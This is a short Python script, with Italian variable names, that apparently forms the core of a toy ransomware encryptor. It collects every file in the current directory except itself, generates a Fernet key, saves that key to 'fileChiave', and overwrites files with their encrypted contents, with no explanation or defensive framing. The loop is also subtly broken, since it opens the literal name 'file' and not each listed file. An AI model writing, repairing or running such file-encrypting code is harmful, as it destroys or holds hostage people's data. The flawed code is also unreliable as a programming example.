#!/usr/bin/python3

import os

from cryptography.fernet import Fernet

lista_files = []

for file in os.listdir():
	if file == "main.py" or file == "fileChiave":
		continue
	if os.path.isfile(file):
		lista_files.append(file)

print(lista_files)

key = Fernet.generate_key()

with open ("fileChiave", "wb") as fileChiave:
	fileChiave.write(key)

for file in lista_files:
	with open("file", "rb") as ilFile:
		content = ilFile.read()
		encrypted_content = Fernet(key).encrypt(content)

	with open("file", "wb") as ilFile:
		ilFile.write(encrypted_content)